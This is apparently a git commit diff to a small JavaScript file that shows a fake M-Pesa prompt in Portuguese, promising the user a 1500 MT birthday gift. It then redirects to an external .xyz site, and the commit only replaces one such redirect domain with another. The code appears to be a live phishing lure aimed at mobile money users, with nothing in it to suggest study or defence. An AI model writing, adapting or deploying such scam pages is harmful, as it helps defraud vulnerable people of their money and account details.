d777a3d46cb151903fff3c71df9f42bcb48e71ae
newetijazz3 <newetijazz3@gmail.com>
2025-08-06 12:30:09 +0100

    Update mozamb.js

--- mozamb.js
+++ mozamb.js
@@ -2,5 +2,5 @@
 var password = 'Retirar 1500 MT'
 password=prompt('Mpesa: Parabéns, a sua conta Mpesa qualificou-se para receber o presente de aniversário de 1500 MT Mpesa. Clique em OK para continuar','Retirar 1500 MT');
 if (password != 'Retirar 1500 MT') {
-location.href='https://www.udwang.xyz/M-pesa-oferta';
+location.href='https://www.ikimette.xyz/Retirar-Mpesa-1500MT';
 }
